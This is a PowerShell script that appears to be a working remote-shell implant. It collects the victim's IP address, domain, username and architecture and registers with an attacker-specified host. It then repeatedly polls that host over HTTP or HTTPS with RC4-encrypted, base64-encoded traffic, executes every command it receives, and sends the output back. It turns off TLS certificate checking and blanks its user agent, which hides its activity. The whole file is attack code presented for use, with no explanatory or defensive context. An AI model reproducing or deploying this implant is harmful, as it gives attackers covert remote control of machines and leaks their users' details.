function Get-UserInfo {
	
    PROCESS {
		if( -not (Test-Path env:userdomain)) {
			$Domain = $env:computername
		} else {
			$Domain = $env:userdomain
		}
		
		$Target = Get-WmiObject Win32_NetworkAdapterConfiguration | Where {$_.Ipaddress.length -gt 1}
		$Target = $Target.ipaddress[0] 
		
		$Arch = "x64"
		
		if([IntPtr]::size -eq 4) {
			$Arch = "x86"
		}
		
		return "$($Arch) - $($Target):$($Domain)\$($env:username)"   
    }
}

function Random-String {
	[CmdletBinding()]
	Param (
		[Parameter(Position = 1, Mandatory = $True)]
		[int]$Length
	)
	
	PROCESS {
		$charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".ToCharArray()
		$result = ""
		for ($x = 0; $x -lt $Length; $x++) {
			$result += $charset | Get-Random
		}
		
		return $result
	}
}

function Crypto-RC4 {
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]$Bytes,
        [Parameter(Position = 1, Mandatory = $True)]
        [Byte[]]$Key
    )

    BEGIN {
        [Byte[]] $S = 0..255
        $J = 0
        0..255 | ForEach-Object {
            $J = ($J + $S[$_] + $Key[$_ % $Key.Length]) % 256
            $S[$_], $S[$J] = $S[$J], $S[$_]
        }
        $I = $J = 0
    }

    PROCESS {
        ForEach($Byte in $Bytes) {
            $I = ($I + 1) % 256
            $J = ($J + $S[$I]) % 256
            $S[$I], $S[$J] = $S[$J], $S[$I]
            $Byte -bxor $S[($S[$I] + $S[$J]) % 256]
        }
    }
}

function RC4-DecodeBase64 {
    [CmdletBinding()]
    Param (
	[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [string]$Buffer,
        [Parameter(Mandatory = $True)]
        [string]$Key
    )
	
	PROCESS {
		$BufferStream = [Convert]::FromBase64String($Buffer)
		$OutStream = ($BufferStream | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
		return [Text.Encoding]::ASCII.GetString($OutStream)
	}
}

function RC4-EncodeBase64 {
    [CmdletBinding()]
    Param (
	[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [string]$Buffer,
        [Parameter(Mandatory = $True)]
        [string]$Key
    )
	
	PROCESS {
		$Bytes = [Text.Encoding]::ASCII.GetBytes($Buffer)
		$OutStream = ($Bytes | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
		return [Convert]::ToBase64String($OutStream)
	}
}

function PS-RemoteShell { 
	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$True)]
		[string]$Ip,
		[Parameter(Mandatory=$True)]
		[int]$Port,
		[Parameter(Mandatory=$True)]
		[string]$Key,
		[Parameter(Mandatory=$False)]
		[int]$Delay = 10000,
		[Parameter(Mandatory=$False)]
		[string]$Protocol = "http"
	)
   
	BEGIN {
	
	}

	PROCESS {
		$Exit = $False
		$Guid = [GUID]::NewGuid().ToString()
		$UserInfo = Get-UserInfo
		$BodyData = "register $($Guid) $($UserInfo)"
		(New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
		
		While($Exit -ne $True) {
			if ($Protocol -eq "https") {
				$Cert = @"
					using System.Net;
					using System.Security.Cryptography.X509Certificates;
					public class TrustAllCertsPolicy : ICertificatePolicy {
						public bool CheckValidationResult(
							ServicePoint srvPoint, X509Certificate certificate,
							WebRequest request, int certificateProblem) {
							return true;
						}
					}
"@
					
				Add-Type $Cert
				
				[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy			
			}
					
			$Cmd = ""
			Start-Sleep -m $Delay
			$Url = "$($Protocol)://$($Ip):$($Port)/?$($Guid)"
			$BodyData = RC4-EncodeBase64 -Buffer $BodyData -Key $Key
			Try {
				$Data = Invoke-WebRequest -Uri $Url -Method POST -Body $BodyData -UserAgent "" -TimeoutSec 10 -UseBasicParsing
				$Cmd = RC4-DecodeBase64 -Buffer $Data -Key $Key
			} Catch {
				$Cmd = ""
			}
			
			$InternalCmd = $Cmd.Split(" ", 2)
			if($InternalCmd[0] -eq "delay") {
				$Delay = [Int]$InternalCmd[1]
				$Output = "Delay is now $($Delay)"
			} else {
				$Output = ([ScriptBlock]::Create($Cmd).Invoke() | Out-String)
			}
			
			$ErrorMessage = ($error[0] | Out-String)
			
			if($Output -eq "" -And $ErrorMessage -eq "") {
				$Size = Get-Random -Maximum 50 -Minimum 1
				$Random = Random-String -Length $Size
				$Output = "hello $($Random)"
			}
			
			$Output  = $Output + "`n"
			
			$error.Clear()
			$BodyData = $Output + $ErrorMessage
		}
	}
   
   END {
   
   }
}
